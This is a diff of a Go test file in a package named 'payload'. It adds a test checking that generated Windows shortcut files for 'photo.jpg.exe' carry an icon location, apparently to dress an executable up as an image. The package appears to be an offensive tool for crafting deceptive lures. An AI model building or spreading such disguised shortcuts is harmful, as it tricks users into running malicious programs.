@@ -2,6 +2,7 @@ package payload
 
 import (
 	"bytes"
+	"encoding/binary"
 	"strings"
 	"testing"
 )
@@ -46,5 +47,31 @@ func TestBuildCMDLnk(t *testing.T) {
 	}
 	if b[0] != 0x4C {
 		t.Fatalf("header size byte = %d", b[0])
+	}
+}
+
+func TestBuildLnkForExeHasIcon(t *testing.T) {
+	b, err := BuildLnkForExe("photo.jpg.exe")
+	if err != nil {
+		t.Fatal(err)
+	}
+	if len(b) < 0x4C {
+		t.Fatalf("too small: %d", len(b))
+	}
+	if binary.LittleEndian.Uint32(b[20:24])&0x40 == 0 {
+		t.Fatal("HasIconLocation flag not set")
+	}
+	plain, err := BuildLnkForExeWithIcon("photo.jpg.exe", "")
+	if err != nil {
+		t.Fatal(err)
+	}
+	if len(b) <= len(plain) {
+		t.Fatal("icon location missing from lnk")
+	}
+	if binary.LittleEndian.Uint32(plain[20:24])&0x40 != 0 {
+		t.Fatal("empty iconPath should not set HasIconLocation")
+	}
+	if bytes.Contains(plain, []byte("imageres.dll")) {
+		t.Fatal("plain lnk should not contain icon")
 	}
 }
